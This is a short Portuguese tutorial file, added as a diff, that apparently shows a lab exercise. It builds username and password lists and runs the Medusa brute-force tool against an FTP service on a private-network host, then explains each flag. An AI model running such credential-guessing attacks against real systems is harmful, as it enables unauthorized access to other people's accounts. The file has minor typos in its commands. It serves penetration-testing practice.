@@ -1,0 +1,17 @@
+Simulando um acesso ao FTP utilizando o Medusa
+
+No sistyema operacional Kali
+Passo 1 - Criar uma lista de usuarios e senhas
+echo -e "user\nmsfadmin\nadmin\root" > users.txt
+
+echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
+
+Passo 2 - Executando o ataque
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+
+-h - Host da vitima
+-U - arquivos com usuarios para serem testados
+-P - arquivo com as senhas a serem testadas
+-m - serviço a ser atacado, no caso, FTP
+-t - quantos threads podem ser usadas nesse ataque
